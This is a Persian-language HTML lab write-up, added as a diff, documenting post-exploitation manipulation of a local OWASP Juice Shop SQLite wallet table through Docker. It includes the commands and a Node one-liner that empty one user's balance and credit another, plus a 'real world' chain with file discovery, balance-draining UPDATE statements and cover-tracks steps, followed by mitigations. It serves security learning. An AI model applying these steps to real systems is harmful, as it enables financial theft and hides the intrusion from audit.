@@ -1,0 +1,586 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<title>گزارش دستکاری مستقیم دیتابیس — Wallet Manipulation</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap');
+
+:root{
+  --bg:#0b0d10;
+  --bg-panel:#12151a;
+  --bg-deep:#07090d;
+  --line:#262b33;
+  --text:#d7dbe0;
+  --text-dim:#838d99;
+  --red:#ff4d4f;
+  --red-dim:#7a2426;
+  --green:#3fd68a;
+  --blue:#5aa9ff;
+  --amber:#ffb454;
+  --purple:#b784ff;
+  --teal:#2dd4bf;
+}
+
+*{box-sizing:border-box;margin:0;padding:0;}
+html,body{background:var(--bg);scroll-behavior:smooth;}
+body{font-family:'Vazirmatn',sans-serif;color:var(--text);line-height:1.9;padding-bottom:80px;}
+
+.hero{padding:56px 24px 40px;max-width:960px;margin:0 auto;border-bottom:1px solid var(--line);}
+.hero-tag{
+  font-family:'JetBrains Mono',monospace;direction:ltr;
+  display:inline-block;color:var(--red);font-size:12px;letter-spacing:1.5px;
+  border:1px solid var(--red-dim);background:rgba(255,77,79,0.07);
+  padding:4px 12px;border-radius:4px;margin-bottom:18px;
+}
+.hero h1{font-size:30px;font-weight:800;color:#fff;margin-bottom:10px;}
+.hero p{color:var(--text-dim);font-size:15.5px;max-width:700px;}
+
+.chips{display:flex;gap:8px;flex-wrap:wrap;margin-top:16px;}
+.chip{
+  font-family:'JetBrains Mono',monospace;direction:ltr;font-size:12px;
+  background:var(--bg-panel);border:1px solid var(--line);
+  padding:4px 12px;border-radius:20px;color:var(--text-dim);
+}
+.chip b{color:var(--text);}
+
+main{max-width:960px;margin:0 auto;padding:0 24px;}
+
+.section{margin-top:52px;scroll-margin-top:20px;}
+.section-head{display:flex;align-items:center;gap:12px;margin-bottom:20px;flex-wrap:wrap;}
+.snum{
+  font-family:'JetBrains Mono',monospace;direction:ltr;
+  width:30px;height:30px;border-radius:8px;
+  display:flex;align-items:center;justify-content:center;
+  font-weight:800;font-size:13px;flex-shrink:0;
+}
+.n-red{background:rgba(255,77,79,0.12);border:1px solid var(--red-dim);color:var(--red);}
+.n-amber{background:rgba(255,180,84,0.12);border:1px solid rgba(255,180,84,0.3);color:var(--amber);}
+.n-blue{background:rgba(90,169,255,0.12);border:1px solid rgba(90,169,255,0.3);color:var(--blue);}
+.n-green{background:rgba(63,214,138,0.12);border:1px solid rgba(63,214,138,0.3);color:var(--green);}
+.n-purple{background:rgba(183,132,255,0.12);border:1px solid rgba(183,132,255,0.3);color:var(--purple);}
+.n-teal{background:rgba(45,212,191,0.12);border:1px solid rgba(45,212,191,0.3);color:var(--teal);}
+
+.section-head h2{font-size:19px;font-weight:700;color:#fff;}
+.section-head .en{
+  font-family:'JetBrains Mono',monospace;direction:ltr;
+  color:var(--text-dim);font-size:12px;display:block;margin-top:2px;
+}
+.sev{
+  font-family:'JetBrains Mono',monospace;direction:ltr;
+  font-size:11px;font-weight:700;padding:3px 10px;
+  border-radius:20px;white-space:nowrap;margin-inline-start:auto;align-self:center;
+}
+.sev-critical{background:rgba(255,77,79,0.15);color:var(--red);border:1px solid var(--red-dim);}
+
+.block{background:var(--bg-panel);border:1px solid var(--line);border-radius:10px;padding:18px 22px;margin-bottom:14px;}
+.block h3{font-size:14.5px;font-weight:700;color:#fff;margin-bottom:10px;}
+.block p{font-size:15px;}
+
+pre{
+  font-family:'JetBrains Mono',monospace;
+  direction:ltr;unicode-bidi:isolate;text-align:left;
+  background:var(--bg-deep);border:1px solid var(--line);border-radius:8px;
+  padding:14px 16px;overflow-x:auto;font-size:13px;line-height:1.75;
+  margin:10px 0 0;white-space:pre;
+}
+pre.green{color:#a8f5c8;}
+pre.red{color:#ffa8a8;}
+pre.amber{color:#ffd9a0;}
+pre.blue{color:#a8d4ff;}
+
+code.inline{
+  font-family:'JetBrains Mono',monospace;direction:ltr;unicode-bidi:isolate;
+  background:rgba(255,255,255,0.07);padding:1px 6px;border-radius:4px;font-size:0.91em;
+}
+
+.callout{border-radius:8px;padding:13px 16px;margin-top:12px;font-size:14.5px;line-height:1.75;}
+.callout.green{background:linear-gradient(135deg,rgba(63,214,138,0.10),rgba(63,214,138,0.02));border:1px solid rgba(63,214,138,0.3);color:#c7f5da;}
+.callout.blue{background:linear-gradient(135deg,rgba(90,169,255,0.10),rgba(90,169,255,0.02));border:1px solid rgba(90,169,255,0.3);color:#cfe6ff;}
+.callout.amber{background:linear-gradient(135deg,rgba(255,180,84,0.10),rgba(255,180,84,0.02));border:1px solid rgba(255,180,84,0.35);color:#ffdca8;}
+.callout.red{background:linear-gradient(135deg,rgba(255,77,79,0.10),rgba(255,77,79,0.02));border:1px solid var(--red-dim);color:#ffc0c0;}
+.callout b{font-weight:700;}
+
+hr.div{border:none;border-top:1px dashed var(--line);margin:52px 0 0;}
+
+/* ATTEMPT CARD */
+.attempt{border-radius:10px;margin-bottom:12px;overflow:hidden;}
+.attempt-head{
+  display:flex;align-items:center;gap:10px;padding:12px 18px;
+}
+.attempt-body{padding:14px 18px;border-top:1px solid var(--line);}
+.attempt-body p{font-size:14px;margin-bottom:8px;}
+.attempt.fail{background:rgba(255,77,79,0.05);border:1px solid var(--red-dim);}
+.attempt.fail .attempt-head{background:rgba(255,77,79,0.08);}
+.attempt.success{background:rgba(63,214,138,0.05);border:1px solid rgba(63,214,138,0.3);}
+.attempt.success .attempt-head{background:rgba(63,214,138,0.08);}
+.attempt.partial{background:rgba(255,180,84,0.05);border:1px solid rgba(255,180,84,0.3);}
+.attempt.partial .attempt-head{background:rgba(255,180,84,0.08);}
+
+.badge{
+  font-family:'JetBrains Mono',monospace;direction:ltr;
+  font-size:11px;font-weight:700;padding:3px 10px;border-radius:20px;
+}
+.badge.fail{background:rgba(255,77,79,0.2);color:var(--red);border:1px solid var(--red-dim);}
+.badge.ok{background:rgba(63,214,138,0.2);color:var(--green);border:1px solid rgba(63,214,138,0.3);}
+.badge.partial{background:rgba(255,180,84,0.2);color:var(--amber);border:1px solid rgba(255,180,84,0.3);}
+.attempt-head h4{font-size:14.5px;font-weight:700;color:#fff;flex:1;}
+
+/* CHAIN */
+.chain{margin-top:14px;}
+.chain-step{display:flex;gap:16px;}
+.chain-step:not(:last-child){padding-bottom:8px;}
+.chain-left{display:flex;flex-direction:column;align-items:center;flex-shrink:0;}
+.chain-dot{
+  width:36px;height:36px;border-radius:50%;
+  display:flex;align-items:center;justify-content:center;
+  font-family:'JetBrains Mono',monospace;direction:ltr;
+  font-weight:800;font-size:13px;flex-shrink:0;
+}
+.chain-line{width:2px;flex:1;background:var(--line);margin:4px auto 0;}
+.chain-content{padding-bottom:24px;flex:1;}
+.chain-content h4{font-size:14.5px;font-weight:700;margin-bottom:6px;}
+.chain-content p{font-size:14px;color:var(--text);}
+.cd-red{background:rgba(255,77,79,0.15);border:2px solid var(--red-dim);color:var(--red);}
+.cd-amber{background:rgba(255,180,84,0.15);border:2px solid rgba(255,180,84,0.3);color:var(--amber);}
+.cd-blue{background:rgba(90,169,255,0.15);border:2px solid rgba(90,169,255,0.3);color:var(--blue);}
+.cd-green{background:rgba(63,214,138,0.15);border:2px solid rgba(63,214,138,0.3);color:var(--green);}
+
+/* BEFORE/AFTER */
+.before-after{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:12px;}
+.ba-box{background:var(--bg-deep);border:1px solid var(--line);border-radius:8px;padding:14px 16px;}
+.ba-box h5{font-size:13px;font-weight:700;margin-bottom:10px;padding-bottom:8px;border-bottom:1px solid var(--line);}
+.ba-box.before h5{color:var(--blue);}
+.ba-box.after h5{color:var(--green);}
+.ba-row{display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid rgba(255,255,255,0.05);font-size:13.5px;}
+.ba-row:last-child{border-bottom:none;}
+.ba-row .email{color:var(--text-dim);font-size:13px;}
+.ba-row .amount{font-family:'JetBrains Mono',monospace;direction:ltr;font-weight:700;}
+.ba-box.before .amount{color:var(--blue);}
+.ba-box.after .amount.changed{color:var(--green);}
+.ba-box.after .amount.zeroed{color:var(--red);}
+
+table.t{width:100%;border-collapse:collapse;margin-top:12px;font-size:13.5px;}
+table.t th,table.t td{text-align:right;padding:9px 12px;border-bottom:1px solid var(--line);}
+table.t th{color:var(--text-dim);font-size:12px;letter-spacing:1px;text-transform:uppercase;}
+table.t td.m{font-family:'JetBrains Mono',monospace;direction:ltr;font-size:12px;}
+table.t tr:last-child td{border-bottom:none;}
+
+footer{
+  max-width:960px;margin:60px auto 0;padding:20px 24px 0;
+  border-top:1px solid var(--line);color:var(--text-dim);font-size:13px;text-align:center;
+}
+</style>
+</head>
+<body>
+
+<div class="hero">
+  <span class="hero-tag">// POST-EXPLOITATION · DATABASE MANIPULATION</span>
+  <h1>دستکاری مستقیم دیتابیس — انتقال موجودی Wallet</h1>
+  <p>شبیه‌سازی حمله‌ی Post-Exploitation: دسترسی مستقیم به دیتابیس SQLite از طریق Docker و دستکاری جدول مالی — خالی کردن حساب قربانی و انتقال موجودی به حساب مهاجم.</p>
+  <div class="chips">
+    <span class="chip">Phase: <b>Post-Exploitation</b></span>
+    <span class="chip">Target: <b>Wallets table</b></span>
+    <span class="chip">Severity: <b>Critical</b></span>
+    <span class="chip">Result: <b>Financial Manipulation</b></span>
+  </div>
+</div>
+
+<main>
+
+<!-- 1. Context -->
+<section class="section">
+  <div class="section-head">
+    <div class="snum n-blue">1</div>
+    <div>
+      <h2>زمینه‌ی حمله — چرا این ممکنه؟</h2>
+      <span class="en">Attack Context — Why This Is Possible</span>
+    </div>
+  </div>
+
+  <div class="block">
+    <h3>زنجیره‌ی دسترسی</h3>
+    <pre class="blue">
+// Attack chain that led to database access:
+
+Step 1: SQLi on login form
+        → Authentication bypass confirmed
+
+Step 2: UNION-based data extraction
+        → 24 users + password hashes dumped
+
+Step 3: Docker container identified
+        $ sudo docker ps
+        → Container: bkimminich/juice-shop
+
+Step 4: Database file located inside container
+        $ docker exec → node → readdirSync('/juice-shop/data')
+        → juiceshop.sqlite found
+
+Step 5: File copied to local machine
+        $ sudo docker cp [container]:/juice-shop/data/juiceshop.sqlite ~/
+
+Step 6: Direct database manipulation  ← current phase</pre>
+    <div class="callout blue">
+      <b>نکته:</b> در دنیای واقعی، مهاجم از طریق SQLi یا RCE به shell سرور دسترسی پیدا می‌کنه و مستقیم دیتابیس رو دستکاری می‌کنه. ما اینجا از Docker به‌عنوان شبیه‌ساز این دسترسی استفاده می‌کنیم.
+    </div>
+  </div>
+
+  <div class="block">
+    <h3>وضعیت اولیه‌ی Wallet ها</h3>
+    <pre class="blue">
+-- Query before attack:
+SELECT u.email, w.balance FROM Wallets w
+JOIN Users u ON w.UserId = u.id
+WHERE w.UserId IN (1, 2);
+
+-- Result:
+email                  | balance
+-----------------------|--------
+admin@juice-sh.op      |   0
+jim@juice-sh.op        | 100</pre>
+  </div>
+</section>
+
+<hr class="div">
+
+<!-- 2. Attempts & Errors -->
+<section class="section">
+  <div class="section-head">
+    <div class="snum n-red">2</div>
+    <div>
+      <h2>تلاش‌ها، خطاها، و راه‌حل‌ها</h2>
+      <span class="en">Attempts, Errors & Fixes — Full Timeline</span>
+    </div>
+  </div>
+
+  <!-- Attempt 1 -->
+  <div class="attempt fail">
+    <div class="attempt-head">
+      <span class="badge fail">ERROR #1</span>
+      <h4>UPDATE مستقیم در sqlitebrowser — Read-only database</h4>
+    </div>
+    <div class="attempt-body">
+      <p>اولین تلاش: اجرای مستقیم UPDATE در sqlitebrowser روی فایل کپی‌شده:</p>
+      <pre class="red">
+-- Command attempted:
+UPDATE Wallets SET balance = 0 WHERE UserId = 2;
+
+-- Error received:
+Execution finished with errors.
+Result: attempt to write a readonly database
+At line 1:
+UPDATE Wallets SET balance = 0 WHERE UserId = 2;</pre>
+      <p style="margin-top:10px;"><b>دلیل خطا:</b> فایل <code class="inline">juiceshop.sqlite</code> با <code class="inline">docker cp</code> کپی شد و ownership اش به <code class="inline">root:root</code> تعلق داشت. فقط root می‌تونست بنویسه.</p>
+    </div>
+  </div>
+
+  <!-- Diagnosis -->
+  <div class="attempt partial" style="margin-top:12px;">
+    <div class="attempt-head">
+      <span class="badge partial">DIAGNOSIS</span>
+      <h4>بررسی permission های فایل</h4>
+    </div>
+    <div class="attempt-body">
+      <pre class="amber">
+$ ls -la ~/juiceshop.sqlite
+
+-rw-r--r-- 1 root root 258048 Aug 30 17:50 /home/mary/juiceshop.sqlite
+#           ^    ^
+#           |    └── group: root (read only)
+#           └── owner: root (read/write, but we're not root)
+# mary user has only READ permission (r--)</pre>
+    </div>
+  </div>
+
+  <!-- Fix 1 -->
+  <div class="attempt success" style="margin-top:12px;">
+    <div class="attempt-head">
+      <span class="badge ok">FIX #1 — SOLVED ✓</span>
+      <h4>تغییر ownership فایل به mary</h4>
+    </div>
+    <div class="attempt-body">
+      <pre class="green">
+$ sudo chown mary:mary ~/juiceshop.sqlite
+$ chmod 644 ~/juiceshop.sqlite
+
+$ ls -la ~/juiceshop.sqlite
+-rw-r--r-- 1 mary mary 258048 Aug 30 17:50 /home/mary/juiceshop.sqlite
+#                 ^^^^
+#                 now owned by mary → write access granted</pre>
+      <p style="margin-top:10px;">بعد از close و reopen کردن sqlitebrowser، دستور UPDATE بدون خطا اجرا شد.</p>
+    </div>
+  </div>
+
+  <!-- Attempt 2 -->
+  <div class="attempt fail" style="margin-top:12px;">
+    <div class="attempt-head">
+      <span class="badge fail">ERROR #2</span>
+      <h4>تغییر توی فایل محلی — سایت تغییر نکرد</h4>
+    </div>
+    <div class="attempt-body">
+      <p>بعد از UPDATE موفق در sqlitebrowser، توی سایت Juice Shop موجودی تغییری نداشت.</p>
+      <pre class="red">
+// Problem:
+~/juiceshop.sqlite        ← local copy (what we edited)
+/juice-shop/data/juiceshop.sqlite  ← live database inside Docker (unchanged!)
+
+// These are TWO different files
+// Editing the local copy doesn't affect the running application</pre>
+      <p style="margin-top:10px;"><b>دلیل:</b> Juice Shop داده‌ها رو از دیتابیس داخل کانتینر می‌خونه — نه از نسخه‌ی محلی.</p>
+    </div>
+  </div>
+
+  <!-- Attempt 3 -->
+  <div class="attempt fail" style="margin-top:12px;">
+    <div class="attempt-head">
+      <span class="badge fail">ERROR #3</span>
+      <h4>docker cp برای برگردوندن فایل — container not running</h4>
+    </div>
+    <div class="attempt-body">
+      <pre class="red">
+$ sudo docker exec -it a93115842b45 /nodejs/bin/node -e "..."
+
+Error response from daemon:
+container a93115842b45b1e1d7bb79676bbbe788151f05ba44459f8fb78ffec83992f1b9
+is not running
+
+$ sudo docker ps -a
+CONTAINER ID   IMAGE         STATUS
+a93115842b45   hello-world   Exited (0) About a minute ago
+# ← This is hello-world, NOT Juice Shop!
+# Juice Shop container was removed</pre>
+      <p style="margin-top:10px;"><b>دلیل:</b> کانتینر Juice Shop بعد از restart حذف شده بود. کانتینر `hello-world` هم که ربطی به Juice Shop نداشت.</p>
+    </div>
+  </div>
+
+  <!-- Fix 2 -->
+  <div class="attempt success" style="margin-top:12px;">
+    <div class="attempt-head">
+      <span class="badge ok">FIX #2 — SOLVED ✓</span>
+      <h4>اجرای مجدد Juice Shop + دستکاری مستقیم داخل کانتینر</h4>
+    </div>
+    <div class="attempt-body">
+      <pre class="green">
+-- Step 1: Run Juice Shop again
+$ sudo docker run -d -p 127.0.0.1:3000:3000 bkimminich/juice-shop
+
+-- Step 2: Get new container ID
+$ sudo docker ps
+CONTAINER ID   IMAGE                   STATUS
+f5f3ae3f9615   bkimminich/juice-shop   Up 2 minutes
+
+-- Step 3: Manipulate database DIRECTLY inside container
+$ sudo docker exec -it f5f3ae3f9615 /nodejs/bin/node -e \
+"const {Sequelize}=require('/juice-shop/node_modules/sequelize');
+const db=new Sequelize({dialect:'sqlite',storage:'/juice-shop/data/juiceshop.sqlite'});
+db.query('UPDATE Wallets SET balance=0 WHERE UserId=2').then(()=>{
+  console.log('Jim wallet: 0');
+  db.query('UPDATE Wallets SET balance=balance+100 WHERE UserId=1').then(()=>{
+    console.log('Admin wallet: +100');
+    process.exit(0);
+  });
+});"
+
+-- Output:
+Executing (default): UPDATE Wallets SET balance=0 WHERE UserId=2
+Jim wallet: 0
+Executing (default): UPDATE Wallets SET balance=balance+100 WHERE UserId=1
+Admin wallet: +100    ← SUCCESS!</pre>
+    </div>
+  </div>
+</section>
+
+<hr class="div">
+
+<!-- 3. Result -->
+<section class="section">
+  <div class="section-head">
+    <div class="snum n-green">3</div>
+    <div>
+      <h2>نتیجه‌ی نهایی — تأیید دستکاری</h2>
+      <span class="en">Final Result — Manipulation Confirmed</span>
+    </div>
+  </div>
+
+  <div class="block">
+    <h3>مقایسه‌ی قبل و بعد</h3>
+    <div class="before-after">
+      <div class="ba-box before">
+        <h5>Before Attack</h5>
+        <div class="ba-row">
+          <span class="email">admin@juice-sh.op</span>
+          <span class="amount">$0</span>
+        </div>
+        <div class="ba-row">
+          <span class="email">jim@juice-sh.op</span>
+          <span class="amount">$100</span>
+        </div>
+      </div>
+      <div class="ba-box after">
+        <h5>After Attack</h5>
+        <div class="ba-row">
+          <span class="email">admin@juice-sh.op</span>
+          <span class="amount changed">$100 ↑</span>
+        </div>
+        <div class="ba-row">
+          <span class="email">jim@juice-sh.op</span>
+          <span class="amount zeroed">$0 ↓</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="block">
+    <h3>تأیید از طریق سایت</h3>
+    <pre class="green">
+-- Jim's wallet page (/#/wallet):
+Balance: $0    ← confirmed empty
+
+-- Admin's wallet page (/#/wallet):
+Balance: $100  ← confirmed increased
+
+-- Database verification query:
+SELECT u.email, w.balance FROM Wallets w
+JOIN Users u ON w.UserId = u.id
+WHERE w.UserId IN (1,2);
+
+Result:
+email                  | balance
+-----------------------|--------
+admin@juice-sh.op      | 100     ← +100 added
+jim@juice-sh.op        |   0     ← emptied</pre>
+    <div class="callout green">
+      <b>نتیجه:</b> دستکاری مستقیم دیتابیس کاملاً موفق بود — موجودی Jim به admin منتقل شد بدون هیچ تراکنشی از طریق UI.
+    </div>
+  </div>
+</section>
+
+<hr class="div">
+
+<!-- 4. Lessons -->
+<section class="section">
+  <div class="section-head">
+    <div class="snum n-amber">4</div>
+    <div>
+      <h2>درس‌های فنی از این مسیر</h2>
+      <span class="en">Technical Lessons Learned</span>
+    </div>
+  </div>
+
+  <div class="block">
+    <table class="t">
+      <tr><th>خطا</th><th>Root Cause</th><th>Fix</th></tr>
+      <tr>
+        <td>Read-only database</td>
+        <td class="m">docker cp → root:root ownership</td>
+        <td><code class="inline">sudo chown mary:mary</code></td>
+      </tr>
+      <tr>
+        <td>تغییر در سایت اعمال نشد</td>
+        <td>فایل محلی ≠ دیتابیس زنده‌ی Docker</td>
+        <td>دستکاری مستقیم داخل کانتینر</td>
+      </tr>
+      <tr>
+        <td>Container not running</td>
+        <td>آیدی اشتباه (hello-world به‌جای juice-shop)</td>
+        <td><code class="inline">docker run</code> مجدد + آیدی جدید</td>
+      </tr>
+    </table>
+  </div>
+
+  <div class="block">
+    <h3>تفاوت دو روش دستکاری</h3>
+    <pre class="amber">
+Method 1 — Edit local copy then docker cp back:
+  + Easier to use GUI tools (sqlitebrowser)
+  - Two-step process (edit + copy back)
+  - Risk of container restart wiping changes
+  - File ownership issues
+
+Method 2 — Execute directly inside container (BETTER):
+  + Changes apply immediately to live database
+  + No file transfer needed
+  + No ownership issues
+  - Requires Node.js/Sequelize knowledge
+  - No GUI — command line only</pre>
+  </div>
+</section>
+
+<hr class="div">
+
+<!-- 5. Real World -->
+<section class="section">
+  <div class="section-head">
+    <div class="snum n-red">5</div>
+    <div>
+      <h2>دنیای واقعی — این حمله چطور اتفاق می‌افته؟</h2>
+      <span class="en">Real World — How This Attack Happens</span>
+    </div>
+    <span class="sev sev-critical">CRITICAL</span>
+  </div>
+
+  <div class="block">
+    <pre class="red">
+// Real-world attack chain leading to financial DB manipulation:
+
+Phase 1 — Initial Access:
+  SQLi / RCE / File Inclusion
+  → Shell access on server
+
+Phase 2 — Discovery:
+  $ find / -name "*.sqlite" -o -name "*.db" 2>/dev/null
+  → Database file located
+
+Phase 3 — Manipulation:
+  $ sqlite3 /app/data/production.db
+  sqlite> UPDATE accounts SET balance=0 WHERE user_id=victim;
+  sqlite> UPDATE accounts SET balance=balance+X WHERE user_id=attacker;
+
+Phase 4 — Cover Tracks:
+  → Delete logs
+  → Restore original timestamps
+  → Remove shell history
+
+// This bypasses ALL application-level security:
+// ✗ Authentication   (not needed — direct DB access)
+// ✗ Authorization    (not checked — bypassed)
+// ✗ Rate limiting    (irrelevant — one SQL query)
+// ✗ Audit logs       (application-level logs bypassed)</pre>
+    <div class="callout red">
+      <b>چرا این خطرناک‌ترین نوع دسترسیه؟</b> وقتی مهاجم به دیتابیس مستقیم دسترسی داره، تمام لایه‌های امنیتی اپلیکیشن (authentication، authorization، validation) کاملاً bypass می‌شن. هر داده‌ای قابل خواندن، تغییر، یا حذفه.
+    </div>
+  </div>
+
+  <div class="block">
+    <h3>راه‌حل‌های پیشنهادی</h3>
+    <pre class="green">
+// Fix 1 — Database encryption:
+SQLCipher or similar → even with file access, data is unreadable
+
+// Fix 2 — Principle of least privilege:
+App DB user: SELECT, INSERT, UPDATE only (no DROP, no direct file access)
+Separate read-only user for reporting
+
+// Fix 3 — File system permissions:
+chmod 600 /app/data/production.db
+chown app_user:app_group /app/data/production.db
+// Only the application process can read/write
+
+// Fix 4 — Database audit logging:
+Log ALL write operations with timestamp + source IP
+Alert on unusual UPDATE patterns (large balance changes)
+
+// Fix 5 — Defense in depth:
+Prevent SQLi → prevent RCE → prevent shell access
+Each layer reduces risk of reaching the database directly</pre>
+  </div>
+</section>
+
+</main>
+
+<footer>
+  Personal Security Testing Notes — Direct Database Manipulation · OWASP Juice Shop · Local Lab · Sep 2026
+</footer>
+</body>
+</html>
